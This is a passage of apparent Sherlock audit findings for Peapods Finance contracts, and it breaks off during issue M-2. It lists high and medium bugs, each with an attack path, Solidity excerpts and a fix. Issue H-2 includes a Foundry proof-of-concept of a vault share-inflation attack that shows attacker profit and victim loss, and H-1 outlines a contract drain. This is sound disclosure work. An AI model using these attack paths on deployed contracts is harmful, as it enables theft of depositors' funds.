# Issue H-1: `PodUnwrapLocker` can be drained due to an arbitrary input 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/37 

## Found by 
0xgh0st, X77, gegul

### Summary

`PodUnwrapLocker` can be drained due to an arbitrary input

### Root Cause

`PodUnwrapLocker` provides a functionality to debond your pod tokens without paying a fee by locking them for a period of time. The issue is that the function allows an arbitrary pod input which allows for a complete drain of the contract:
```solidity
function debondAndLock(address _pod, uint256 _amount) external nonReentrant {
       // NO CHECK FOR THE POD HERE
}
```

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. A malicious contract is provided as the pod upon calling `debondAndLock()`
2. In the line below, pod returns an array of 2 addresses which are both the same token, token `X` (token to be drained, deposited by other users who are using the contract functionality):
```solidity
IDecentralizedIndex.IndexAssetInfo[] memory _podTokens = _podContract.getAllAssets();
```
3. In the line below, we store the token `X` balances in both of the array fields, let's say 100 tokens:
```solidity
for (uint256 i = 0; i < _tokens.length; i++) {
            _tokens[i] = _podTokens[i].token;
            _balancesBefore[i] = IERC20(_tokens[i]).balanceOf(address(this));
        }
```
4. We then call `debond()` on our contract which transfers in 100 tokens of `X`
5. In the line below, we fill the received amounts array with 100 tokens twice:
```solidity
for (uint256 i = 0; i < _tokens.length; i++) {
            _receivedAmounts[i] = IERC20(_tokens[i]).balanceOf(address(this)) - _balancesBefore[i];
        }
```
6. We return our own config with a 0 duration to immediately withdraw and store our received amounts in the locks mapping
7. We go over our token `X` twice with 100 amount in both fields, receiving 200 tokens even though we put in 100

### Impact

Theft of funds

### PoC

_No response_

### Mitigation

Do not allow arbitrary pods

# Issue H-2: Vault inflation attack in `AutoCompoundingPodLp` is possible due to incorrectly minting dead shares 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/166 

## Found by 
X77, pkqs90

### Summary

Vault inflation attack in `AutoCompoundingPodLp` is possible due to incorrectly minting dead shares

### Root Cause

The `AutoCompoundingPodLpFactory` tries to protect against an inflation attack by minting shares upon the deployment:
```solidity
    function _depositMin(address _aspAddy, IDecentralizedIndex _pod) internal {
        ...
        AutoCompoundingPodLp(_aspAddy).deposit(minimumDepositAtCreation, _msgSender());
    }
```
The issue is that this incorrectly mints the shares to the `msg.sender` which means that these are not actually __dead__ shares as they can be withdrawn at any time. This allows a vault inflation attack.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

This ideally happens in a batch transaction: 
1. Alice frontruns the deployment which mints her the minimum deposit of 1e3 shares and providing 1e3 assets due to the issue explained of minting to the sender instead of minting to a dead address
2. She then directly transfers an amount of a reward token which upon swapping during the reward processing, increases the total assets by 1, now the state is `1e3 + 1` assets and 1e3 shares
3. Alice withdraws all but 2 of her assets, which has the following formula: `(1e3 - 1) * 1e18 / (1e18 * (1e3 + 1) / 1e3) = 999` as it rounds up, now the state is 2 assets and 1 share
4. Alice can now, in a loop, deposit `2 * totalAssets - 1` which will mint her 1 share, then withdraw 1 asset which will burn her 1 share, this will exponentially grow the total assets while the share will stay at 1 (happens due to round downs and round ups)
5. After some iterations, the share value will be very high, causing a round down in the next depositor's deposit, resulting in a loss of funds for him and a profit for Alice

### Impact

Vault inflation causing loss of funds for the victim and a profit for the attacker

### PoC

Add the following function in `AutoCompoundingPodLp` as written in a comment in my POC, this is for simplicity purposes to mock the reward accrual explained in step 2 of the attack path:
```solidity
    function increase() public {
        _totalAssets += 1;
    }
```
Paste the following POC in `AutoCompoundingPodLp.t.sol`:
```solidity
function testShareInflation() public {
        address attacker = makeAddr('attacker');
        address asset = autoCompoundingPodLp.asset();
        deal(asset, attacker, 20e18);
        
        uint256 attackerInitialBalance = IERC20(asset).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(asset).approve(address(autoCompoundingPodLp), type(uint256).max);
        autoCompoundingPodLp.deposit(1e3, attacker); // Mocking the factory initial share mint of 1e3
        vm.stopPrank();

        assertEq(autoCompoundingPodLp.totalAssets(), 1e3);
        assertEq(autoCompoundingPodLp.totalSupply(), 1e3);

        vm.startPrank(attacker);
        autoCompoundingPodLp.increase();
        IERC20(asset).transfer(address(autoCompoundingPodLp), 1);
        /* ADDED THE FOLLOWING FUNCTION IN THE `AutoCompoundingPodLp` for simplicity purposes as I don't want to deal with mocks and integrations, this will usually happen by directly transferring tokens to the contract and procesing the rewards. Note that even if the total assets increase by more than that, issue remains the same.
        function increase() public {
            _totalAssets += 1;
        }
        */

        assertEq(autoCompoundingPodLp.totalAssets(), 1e3 + 1);

        autoCompoundingPodLp.withdraw(1e3 - 1, attacker, attacker);

        assertEq(autoCompoundingPodLp.totalAssets(), 2);
        assertEq(autoCompoundingPodLp.totalSupply(), 1); // Achieved state of 2 assets and 1 share

        for (uint256 i; i < 40; i++) {
            uint256 assetsToDeposit = autoCompoundingPodLp.totalAssets() * 2 - 1;
            autoCompoundingPodLp.deposit(assetsToDeposit, attacker);

            autoCompoundingPodLp.withdraw(1, attacker, attacker);
        }
        vm.stopPrank();

        assertEq(autoCompoundingPodLp.totalAssets(), 12157665459056928802);
        assertEq(autoCompoundingPodLp.totalSupply(), 1); // 1 share is worth the above assets
        
        address victim = makeAddr('victim');
        deal(asset, victim, 20e18);
        uint256 victimBeforeBalance = IERC20(asset).balanceOf(victim);
        vm.startPrank(victim);
        IERC20(asset).approve(address(autoCompoundingPodLp), 20e18);
        autoCompoundingPodLp.deposit(20e18, victim);
        vm.stopPrank();

        assertEq(autoCompoundingPodLp.totalSupply(), 2); // Total supply is now 2 shares, user only received 1 share despite depositing more than the total assets (round down)

        vm.startPrank(attacker);
        autoCompoundingPodLp.redeem(1, attacker, attacker);
        vm.stopPrank();


        vm.startPrank(victim);
        autoCompoundingPodLp.redeem(1, victim, victim);
        vm.stopPrank();
        
        uint256 attackerAfterBalance = IERC20(asset).balanceOf(attacker);
        uint256 attackerProfit = attackerAfterBalance - attackerInitialBalance;
        assertEq(attackerProfit, 3921167270471535599); // PROFIT

        uint256 victimAfterBalance = IERC20(asset).balanceOf(victim);
        uint256 victimLoss = victimBeforeBalance - victimAfterBalance;
        assertEq(victimLoss, 3921167270471535599); // LOSS
    }
```

### Mitigation

```diff
    function _depositMin(address _aspAddy, IDecentralizedIndex _pod) internal {
        address _lpToken = _pod.lpStakingPool();
        IERC20(_lpToken).safeTransferFrom(_msgSender(), address(this), minimumDepositAtCreation);
        IERC20(_lpToken).safeIncreaseAllowance(_aspAddy, minimumDepositAtCreation);
-       AutoCompoundingPodLp(_aspAddy).deposit(minimumDepositAtCreation, _msgSender());
+       AutoCompoundingPodLp(_aspAddy).deposit(minimumDepositAtCreation, address(0xdead));
    }
```

# Issue H-3: Pod DoS if the LEAVE_AS_PAIRED_LP_TOKEN option is enabled 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/175 

## Found by 
TessKimy, fibonacci

### Summary

Pods swap fee process includes distributing fees through the `TokenRewards` contract, which reverts on `depositFromPairedLpToken` if the `LEAVE_AS_PAIRED_LP_TOKEN` option is enabled.

### Root Cause

In [`TokenRewards.sol:152`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L152), if the `LEAVE_AS_PAIRED_LP_TOKEN` option is enabled, `PAIRED_LP_TOKEN` is deposited without being swapped for `rewardsToken`.  

In the [`_depositRewards`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L215) function, there is a requirement statement that reverts the transaction if the deposited token is not the reward token and there are no stakers yet (`totalShares == 0`).  

Therefore, if there are no stakers and the `LEAVE_AS_PAIRED_LP_TOKEN` option is enabled, all transactions that include `depositFromPairedLpToken` will revert.

### Internal Pre-conditions

- The `LEAVE_AS_PAIRED_LP_TOKEN` option is enabled.
- `PAIRED_LP_TOKEN` != `lpRewardsToken`.  
- The pod has accumulated some fees (balance > 0).

### External Pre-conditions

There is liquidity in the pool (pool balance > 0).

### Attack Path

1. Users bond some tokens → The pod accumulates some fees.  
2. One of the users adds liquidity to the pool → The pool balance becomes > 0.  
3. Now, no one can debond their tokens, as the debond operation triggers `_processPreSwapFeesAndSwap`, and all conditions to swap fees and call `depositFromPairedLpToken` are met.  The transaction reverts because there are no stakers in `TokenRewards`.  
4. At the same time, no one can stake tokens, because staking also triggers `_processPreSwapFeesAndSwap`. 
5. There is no way to recover from this state, because even if liquidity providers remove all the liquidity, the V2 pool mints some dead shares on the first mint, so there will always be some tokens remaining in the pool.

### Impact

This issue causes a permanent Pod DoS, leading to users losing their funds.

### PoC

Add this test to `WeightedIndexTest.t.sol`.

```solidity
function test_LeaveAsPairedLpToken() public {
    IDecentralizedIndex.Config memory _c;
    IDecentralizedIndex.Fees memory _f;
    _f.bond = fee;
    _f.debond = fee;
    address[] memory _t = new address[](1);
    _t[0] = address(peas);
    uint256[] memory _w = new uint256[](1);
    _w[0] = 100;
    address _pod = _createPod(
        "Test",
        "pTEST",
        _c,
        _f,
        _t,
        _w,
        address(0),
        true,
        abi.encode(
            dai,
            address(peas),
            0x6B175474E89094C44Da98b954EedeAC495271d0F,
            0x7d544DD34ABbE24C8832db27820Ff53C151e949b,
            rewardsWhitelist,
            0x024ff47D552cB222b265D68C7aeB26E586D5229D,
            dexAdapter
        )
    );
    pod = WeightedIndex(payable(_pod));

    // 1. Users bond some tokens → The pod accumulates some fees.  
    vm.startPrank(alice);
    peas.approve(address(pod), type(uint256).max);
    pod.bond(address(peas), bondAmt, 0);
    vm.stopPrank();

    vm.startPrank(bob);
    peas.approve(address(pod), type(uint256).max);
    pod.bond(address(peas), bondAmt, 0);
    vm.stopPrank();

    // 2. One of the users adds liquidity to the pool → The pool balance becomes > 0.
    uint256 podTokensToAdd = 1e18;
    uint256 pairedTokensToAdd = 1e18;
    uint256 slippage = 50;

    deal(pod.PAIRED_LP_TOKEN(), alice, pairedTokensToAdd);
    vm.startPrank(alice);
    IERC20(pod.PAIRED_LP_TOKEN()).approve(address(pod), pairedTokensToAdd);
    uint256 lpTokensReceived = pod.addLiquidityV2(podTokensToAdd, pairedTokensToAdd, slippage, block.timestamp);

    // 3. Now, no one can debond their tokens, as the debond operation triggers `_processPreSwapFeesAndSwap`,
    // and all conditions to swap fees and call `depositFromPairedLpToken` are met.
    // The transaction reverts because there are no stakers in `TokenRewards`.
    vm.startPrank(bob);
    address[] memory _n1;
    uint8[] memory _n2;
    vm.expectRevert(bytes("R"));
    pod.debond(bondAmtAfterFee, _n1, _n2);
    vm.stopPrank();

    // 4. At the same time, no one can stake tokens, because staking also triggers `_processPreSwapFeesAndSwap`. 
    address lpStakingPool = pod.lpStakingPool();
    vm.expectRevert(bytes("R"));
    IStakingPoolToken(lpStakingPool).stake(alice, lpTokensReceived);
    vm.stopPrank();

    // 5. There is no way to recover from this state, because even if liquidity providers remove all the liquidity,
    // the V2 pool mints some dead shares on the first mint, so there will always be some tokens remaining in the pool.
    vm.startPrank(alice);
    address v2Pool = pod.DEX_HANDLER().getV2Pool(address(pod), pod.PAIRED_LP_TOKEN());
    IERC20(v2Pool).approve(address(pod), lpTokensReceived);

    uint256 poolBalanceBefore = pod.balanceOf(v2Pool);
    emit log_uint(poolBalanceBefore);
    pod.removeLiquidityV2(
        lpTokensReceived,
        0,
        0,
        block.timestamp
    );
    vm.stopPrank();

    vm.startPrank(bob);
    vm.expectRevert(bytes("R"));
    pod.debond(bondAmtAfterFee, _n1, _n2);
    vm.stopPrank();
}
```

### Mitigation

Before processing the deposit, ensure that there are stakers in the `TokenRewards` contract. Alternatively, modify the deposit logic to burn the deposited `PAIRED_LP_TOKEN`, similar to how `rewardsToken` deposits are handled. 

# Issue H-4: AutoCompoundingPodLp `_pairedLpTokenToPodLp()` does not correctly handle leftover pTKNs. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/442 

## Found by 
RampageAudit, X77, future2\_22, pkqs90, super\_jack


### Summary

AutoCompoundingPodLp `_pairedLpTokenToPodLp()` does not correctly handle leftover pTKNs, leading to either stuck of funds or potential DoS when adding LP.

### Root Cause

First, let's see how the autocompounding process works: 1) swap rewardTKN -> pairedLpTKN, 2) swap a portion (roughly half) of pairedLpTKN -> pTKN, 3) add pairedLpTKN, pTKN to UniV2 LP, 4) stake LP token to spTKN.

In step 3, if add LP fails due to slippage, the pairedLpTKN and pTKN would remain in the contract, and try to process in the next autocompounding epoch.

However, in the following epochs, roughly half of the pairedLpTKN balance would still be swapped to pTKN again. This would make the pairedLpTKN and pTKN amount even more unbalanced.

For example: 

1. Init status: 10000 pairedLpTKN.
2. After epoch 1 swap: 5000 pairedLpTKN, 5000 pTKN.
3. After epoch 2 swap: 2500 pairedLpTKN, 7500 pTKN.
...

The core issue is:

1. When calculating the amount of pairedLpTKN to swap to pTKN in the `_getSwapAmt()` function, it does not take the current pTKN balance into account. This would lead to having too much pTKN left in the contract.
2. When adding liquidity, the entire pairedLpTKN and pTKN balance is used. If this is unbalanced, it is very likely to fail due to slippage.

Note that an attacker can always come and donate pTKN to the contract to trigger the initial unbalanced state of pairedLpTKN/pTKN, which would trigger the snowballing effect leading to more pTKN.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L213

```solidity
    function _tokenToPodLp(address _token, uint256 _amountIn, uint256 _amountLpOutMin, uint256 _deadline)
        internal
        returns (uint256 _lpAmtOut)
    {
        uint256 _pairedOut = _tokenToPairedLpToken(_token, _amountIn);
        if (_pairedOut > 0) {
            uint256 _pairedFee = (_pairedOut * protocolFee) / 1000;
            if (_pairedFee > 0) {
                _protocolFees += _pairedFee;
                _pairedOut -= _pairedFee;
            }
            _lpAmtOut = _pairedLpTokenToPodLp(_pairedOut, _deadline);
            require(_lpAmtOut >= _amountLpOutMin, "M");
        }
    }

    function _pairedLpTokenToPodLp(uint256 _amountIn, uint256 _deadline) internal returns (uint256 _amountOut) {
        address _pairedLpToken = pod.PAIRED_LP_TOKEN();
@>      uint256 _pairedSwapAmt = _getSwapAmt(_pairedLpToken, address(pod), _pairedLpToken, _amountIn);
        uint256 _pairedRemaining = _amountIn - _pairedSwapAmt;
        uint256 _minPtknOut;
        if (address(podOracle) != address(0)) {
            // calculate the min out with 5% slippage
            _minPtknOut = (
                podOracle.getPodPerBasePrice() * _pairedSwapAmt * 10 ** IERC20Metadata(address(pod)).decimals() * 95
            ) / 10 ** IERC20Metadata(_pairedLpToken).decimals() / 10 ** 18 / 100;
        }
        IERC20(_pairedLpToken).safeIncreaseAllowance(address(DEX_ADAPTER), _pairedSwapAmt);
        try DEX_ADAPTER.swapV2Single(_pairedLpToken, address(pod), _pairedSwapAmt, _minPtknOut, address(this)) returns (
            uint256 _podAmountOut
        ) {
            // reset here to local balances to accommodate any residual leftover from previous runs
@>          _podAmountOut = pod.balanceOf(address(this));
@>          _pairedRemaining = IERC20(_pairedLpToken).balanceOf(address(this)) - _protocolFees;
            IERC20(pod).safeIncreaseAllowance(address(indexUtils), _podAmountOut);
            IERC20(_pairedLpToken).safeIncreaseAllowance(address(indexUtils), _pairedRemaining);
            try indexUtils.addLPAndStake(
                pod, _podAmountOut, _pairedLpToken, _pairedRemaining, _pairedRemaining, lpSlippage, _deadline
            ) returns (uint256 _lpTknOut) {
                _amountOut = _lpTknOut;
            } catch {
                IERC20(pod).safeDecreaseAllowance(address(indexUtils), _podAmountOut);
                IERC20(_pairedLpToken).safeDecreaseAllowance(address(indexUtils), _pairedRemaining);
                emit AddLpAndStakeError(address(pod), _amountIn);
            }
        } catch {
            IERC20(_pairedLpToken).safeDecreaseAllowance(address(DEX_ADAPTER), _pairedSwapAmt);
            emit AddLpAndStakeV2SwapError(_pairedLpToken, address(pod), _pairedRemaining);
        }
    }

    function _getSwapAmt(address _t0, address _t1, address _swapT, uint256 _fullAmt) internal view returns (uint256) {
        (uint112 _r0, uint112 _r1) = DEX_ADAPTER.getReserves(DEX_ADAPTER.getV2Pool(_t0, _t1));
        uint112 _r = _swapT == _t0 ? _r0 : _r1;
        return (_sqrt(_r * (_fullAmt * 3988000 + _r * 3988009)) - (_r * 1997)) / 1994;
    }

```

See how slippage is handled. If the input pairedLpTKN and pTKN amount is unbalanced, this is very likely to fail. (e.g. The pool is 1:1, and input amount is 1:3, even if we set slippage=50%, this would still fail.)

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/DecentralizedIndex.sol#L332
```solidity
    function addLiquidityV2(
        uint256 _pTKNLPTokens,
        uint256 _pairedLPTokens,
        uint256 _slippage, // 100 == 10%, 1000 == 100%
        uint256 _deadline
    ) external override lock noSwapOrFee returns (uint256) {
        ...
        DEX_HANDLER.addLiquidity(
            address(this),
            PAIRED_LP_TOKEN,
            _pTKNLPTokens,
            _pairedLPTokens,
@>          (_pTKNLPTokens * (1000 - _slippage)) / 1000,
@>          (_pairedLPTokens * (1000 - _slippage)) / 1000,
            _msgSender(),
            _deadline
        );
        ..
    }
```

### Internal pre-conditions

- Add liquidity pairedLpTKN, pTKN fails due to slippage, leading to leftover pTKNs.

### External pre-conditions

N/A

### Attack Path

Attacker can expedite the unbalance pairedLpTKN/pTKN token ratio by donating pTKN.

### Impact

1. pTKN is stuck in the contract.
2. Add liquidity DoS.

### PoC

N/A

### Mitigation

If there are leftover pTKNs, before swapping pairedLpTKN to pTKN, calculate the amount of pairedLpTKN that can be directly paired up with pTKN to add liquidity. This clears up the leftover pTKN, then we can proceed with the original process.

# Issue H-5: spTKNMinimalOracle `_calculateSpTknPerBase()` does not calculate correct price for podded or fraxlend pair pairedLpTKNs. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/445 

## Found by 
bretzel, pkqs90


### Summary

spTKNMinimalOracle `_calculateSpTknPerBase()` does not calculate correct price for podded or fraxlend pair pairedLpTKNs.

### Root Cause

First, let’s clarify the denomination: tokenA/tokenB represents how much tokenB is worth per tokenA. For example, ETH/USDC = 3000 means 1 ETH is equivalent to 3000 USDC.

The `_calculateSpTknPerBase()` function is used to calculate baseTKN/spTKN. It starts with the `_priceBasePerPTkn18` variable, which is pTKN/baseTKN.

Now, we need to convert pTKN to spTKN. Because spTKN is the Uniswap V2 LP of pTKN and pairedLpTKN, the idea is to use the Uniswap V2 LP fair pricing formula. In order to do that, we need the price of pairedLpTKN/baseTKN.

For normal pods, baseTKN is equal to pairedLpTKN (e.g USDC as pairedLpTKN). However, pods (e.g. pOHM) and fraxlend pair (self-lending pods e.g. fUSDC) tokens are also supported. The bug here is, for both podded tokens and fraxlend pair tokens, the formula is wrong.

From this doc, https://docs.google.com/document/d/1Z-T_07QpJlqXlbBSiC_YverKFfu-gcSkOBzU1icMRkM/edit?tab=t.0, the spTKN is first priced against pairedLpTKN (i.e. spTKN/pairedLpTKN), then converted to spTKN/baseTKN.

The two bugs here are:

1. The current code calculates `_basePerSpTkn18` as if pairedLpTKN/baseTKN is 1:1. However, this is incorrect. We should convert pTKN/baseTKN (which is `_priceBasePerPTkn18`) to pTKN/pairedLpTKN by dividing a `sqrt(ratio)` to the formula, assuming `ratio` to be the asset/share ratio of either podded token or fraxlend pair (Recall that fair LP pricing formula is `fairPrice = 2 * sqrt(k * priceToken1 * priceToken2) / lpSuppply`).

2. After calculating `_basePerSpTkn18` (spTKN/pairedLpTKN), the code reverses it to pairedLpTKN/spTKN, then multiply the asset/share ratio. However, the correct order is to first multiply the asset/share ratio to get spTKN/baseTKN, and then reverse it, and finally we can get baseTKN/spTKN.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L60

```solidity
    function _calculateSpTknPerBase(uint256 _price18) internal view returns (uint256 _spTknBasePrice18) {
        uint256 _priceBasePerPTkn18 = _calculateBasePerPTkn(_price18);
        address _pair = _getPair();

        (uint112 _reserve0, uint112 _reserve1) = V2_RESERVES.getReserves(_pair);
        uint256 _k = uint256(_reserve0) * _reserve1;
        uint256 _kDec = 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token0()).decimals()
            * 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token1()).decimals();
        uint256 _avgBaseAssetInLp18 = _sqrt((_priceBasePerPTkn18 * _k) / _kDec) * 10 ** (18 / 2);
@>      uint256 _basePerSpTkn18 =
            (2 * _avgBaseAssetInLp18 * 10 ** IERC20Metadata(_pair).decimals()) / IERC20(_pair).totalSupply();
        require(_basePerSpTkn18 > 0, "V2R");
@>      _spTknBasePrice18 = 10 ** (18 * 2) / _basePerSpTkn18;

        // if the base asset is a pod, we will assume that the CL/chainlink pool(s) are
        // pricing the underlying asset of the base asset pod, and therefore we will
        // adjust the output price by CBR and unwrap fee for this pod for more accuracy and
        // better handling accounting for liquidation path
        if (BASE_IS_POD) {
            _spTknBasePrice18 = _checkAndHandleBaseTokenPodConfig(_spTknBasePrice18);
        } else if (BASE_IS_FRAX_PAIR) {
            _spTknBasePrice18 = IFraxlendPair(BASE_TOKEN).convertToAssets(_spTknBasePrice18);
        }
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Pods with podded token or fraxlend pair token as pairedLpTKN would have incorrect oracle result, leading to overestimating or underestimating borrow asset value in Fraxlend.

### PoC

N/A

### Mitigation

Fix the formula accordingly. The correct code should be:

```solidity
    function _calculateSpTknPerBase(uint256 _price18) internal view returns (uint256 _spTknBasePrice18) {
        uint256 _priceBasePerPTkn18 = _calculateBasePerPTkn(_price18);
        address _pair = _getPair();

        uint256 cbr;
        if (BASE_IS_POD) {
            cbr = _checkAndHandleBaseTokenPodConfig(1e18);
        } else if (BASE_IS_FRAX_PAIR) {
            cbr = IFraxlendPair(BASE_TOKEN).convertToAssets(1e18);
        }

        (uint112 _reserve0, uint112 _reserve1) = V2_RESERVES.getReserves(_pair);
        uint256 _k = uint256(_reserve0) * _reserve1;
        uint256 _kDec = 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token0()).decimals()
            * 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token1()).decimals();
        uint256 _avgBaseAssetInLp18 = _sqrt((_priceBasePerPTkn18 * _k * 1e18) / _kDec / cbr) * 10 ** (18 / 2);
        uint256 _basePerSpTkn18 =
            (2 * _avgBaseAssetInLp18 * 10 ** IERC20Metadata(_pair).decimals()) / IERC20(_pair).totalSupply();
        _basePerSpTkn18 = _basePerSpTkn18 * cbr / 1e18;
        require(_basePerSpTkn18 > 0, "V2R");
        _spTknBasePrice18 = 10 ** (18 * 2) / _basePerSpTkn18;
    }
```

# Issue H-6: LeverageManager remove leverage will lead to stuck tokens if slippage `_podSwapAmtOutMin` is set. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/446 

## Found by 
X77, ZoA, elolpuer, pkqs90


### Summary

LeverageManager remove leverage will lead to stuck tokens if slippage `_podSwapAmtOutMin` is set.

### Root Cause

First we need to understand the workflow of removeLeverage in LeverageManager.

1. Borrow `_borrowAssetAmt` underlying token from flashloan source.
2. Repay these tokens to FraxlendPair.
3. Withdraw collateral (aspTKN) to borrowedTKN and pTKN. If borrowedTKN is not enough to repay the flashloan, swap pTKN to borrowedTKN.
4. Repay flashloan.
5. Send leftover borrowedTKN and pTKN back to position owner.

In step 3, it conducts an exactOutput swap. The target amount of output is the required amount of borrowedTKN for repay. However, this is susceptible to frontrunning and sandwich attacks. So the user needs to explicitly set a `_podSwapAmtOutMin` parameter as slippage.

The issue here is, if `_podSwapAmtOutMin` is set, and there are leftover borrowTKNs, they are not transferred to the user, but stuck in the contract. This is because `_borrowAmtRemaining` will always be zero in this case.

For example, after redeeming the spTKN, we have 100 pTKN and 100 borrowedTKN (pTKN:borrowedTKN = 1:1). However, we need to repay 120 borrowedTKN. If user don't set `_podSwapAmtOutMin`, the pTKN -> borrowedTKN swap would be a maxInput=100, exactOutput=20 swap, which can obviously be sandwiched. If user sets `_podSwapAmtOutMin` to 95 for slippage, the remaining 95-20=75 borrowedTokens are not transferred back to user.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L1

```solidity
    function _swapPodForBorrowToken(
        address _pod,
        address _targetToken,
        uint256 _podAmt,
        uint256 _targetNeededAmt,
        uint256 _podSwapAmtOutMin
    ) internal returns (uint256 _podRemainingAmt) {
        IDexAdapter _dexAdapter = IDecentralizedIndex(_pod).DEX_HANDLER();
        uint256 _balBefore = IERC20(_pod).balanceOf(address(this));
        IERC20(_pod).safeIncreaseAllowance(address(_dexAdapter), _podAmt);
@>      _dexAdapter.swapV2SingleExactOut(
            _pod, _targetToken, _podAmt, _podSwapAmtOutMin == 0 ? _targetNeededAmt : _podSwapAmtOutMin, address(this)
        );
        _podRemainingAmt = _podAmt - (_balBefore - IERC20(_pod).balanceOf(address(this)));
    }

    function _removeLeveragePostCallback(bytes memory _userData)
        internal
        returns (uint256 _podAmtRemaining, uint256 _borrowAmtRemaining)
    {
        ...
        // pay back flash loan and send remaining to borrower
        uint256 _repayAmount = _d.amount + _d.fee;
        if (_pairedAmtReceived < _repayAmount) {
            _podAmtRemaining = _acquireBorrowTokenForRepayment(
                _props,
                _posProps.pod,
                _d.token,
                _repayAmount - _pairedAmtReceived,
                _podAmtReceived,
                _podSwapAmtOutMin,
                _userProvidedDebtAmtMax
            );
        }
        IERC20(_d.token).safeTransfer(IFlashLoanSource(_getFlashSource(_props.positionId)).source(), _repayAmount);
@>      _borrowAmtRemaining = _pairedAmtReceived > _repayAmount ? _pairedAmtReceived - _repayAmount : 0;
        emit RemoveLeverage(_props.positionId, _props.owner, _collateralAssetRemoveAmt);
    }

```

### Internal pre-conditions

- When removing leverage, a pTKN -> borrowTKN swap is required, and user sets `_podSwapAmtOutMin` for slippage.

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Leftover borrowedTokens are locked in the contract.

### PoC

N/A

### Mitigation

Also transfer the remaining borrowTKN to user.


# Issue H-7: Incorrect reserve mapping leads to fault swap 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/512 

## Found by 
Etherking, Honour, ZoA, pkqs90

### Summary

The function `_getSwapAmt` incorrectly assumes that `_r0` corresponds to `_t0` and `_r1` corresponds to `_t1`. However, Uniswap V2's `getReserves()` returns reserves based on the **sorted** order of token addresses, not based on input order. This mismatch leads to **incorrect swap calculations**, resulting in potential losses and arbitrage opportunities for attackers.

### Root Cause

- The function retrieves reserves via:
  ```solidity
  (uint112 _r0, uint112 _r1) = DEX_ADAPTER.getReserves(DEX_ADAPTER.getV2Pool(_t0, _t1));
  ```
- `UniswapDexAdapter` contract:

  ```solidity
  function getReserves(address _pool) external view virtual override returns (uint112 _reserve0, uint112 _reserve1) {
        (_reserve0, _reserve1,) = IUniswapV2Pair(_pool).getReserves();
    }
  ```

- It assumes `_r0` belongs to `_t0` and `_r1` belongs to `_t1`.
- V2 reserves are always returned in **ascending order of token addresses**.
- If `_t0 > _t1`, `_r0` will belong to `_t1`, and `_r1` will belong to `_t0`, breaking the swap calculation.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/AutoCompoundingPodLp.sol#L392

### Internal Pre-conditions


### External Pre-conditions


### Attack Path


### Impact

The amount of `_pairedLpToken` that needs to be swapped may be miscalculated, causing the swap to fail.
Even if the swap succeeds, it does not work as intended by the protocol, which breaks the design of V2Pool and the `AutoCompoundingPodLp` contract.

### PoC

_No response_

### Mitigation

```solidity
    function _getSwapAmt(address _t0, address _t1, address _swapT, uint256 _fullAmt) internal view returns (uint256) {
        (uint112 _r0, uint112 _r1) = DEX_ADAPTER.getReserves(DEX_ADAPTER.getV2Pool(_t0, _t1));
+++     (address token0,) = sortTokens(_t0, _t1);
+++     (_r0, _r1) = _t0 == token0 ? (_r0, _r1) : (_r1, _r0);
        uint112 _r = _swapT == _t0 ? _r0 : _r1;
        return (_sqrt(_r * (_fullAmt * 3988000 + _r * 3988009)) - (_r * 1997)) / 1994;
    }
```

# Issue M-1: MEV bots will steal from users due to an incorrectly manipulated value 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/41 

## Found by 
Honour, RampageAudit, X77, future2\_22, super\_jack

### Summary

MEV bots will steal from users due to an incorrectly manipulated value

### Root Cause

Upon calling `Zapper::_zap()` to handle a transfer of a different token, we have the following code which is for a direct swap in a Uniswap V3 pool:
```solidity
else {
        _amountOut = _swapV3Single(_in, _getPoolFee(_poolInfo.pool1), _out, _amountIn, _amountOutMin);

}
```
The `_amountOutMin` is provided by the user as slippage. The issue is that upon calling `_swapV3Single()`, we have the following code:
```solidity
uint256 _finalSlip = _slippage[_v3Pool] > 0 ? _slippage[_v3Pool] : _defaultSlippage;
...
DEX_ADAPTER.swapV3Single(_in, _out, _fee, _amountIn, (_amountOutMin * (1000 - _finalSlip)) / 1000, address(this));
```
As seen, the provided minimum amount is manipulated and decreased further.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. User provides 100 tokens to swap and wants at least 90 in return
2. The 90 minimum tokens input is decreased by `_finalSlip` percentage, resulting in the user receiving less than what he provided

### Impact

Theft of funds from innocent users who have done nothing wrong

### PoC

_No response_

### Mitigation

Do not manipulate the value for users who provided a specific amount of minimum tokens to receive

# Issue M-2: Liquidations will revert incorrectly due to an out-of-sync leftover collateral value 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/74 

## Found by 
X77

### Summary

Liquidations will revert incorrectly due to an out-of-sync value

### Root Cause

Upon liquidations, we have this code:
```solidity
_leftoverCollateral = (_userCollateralBalance.toInt256() - _optimisticCollateralForLiquidator.toInt256());

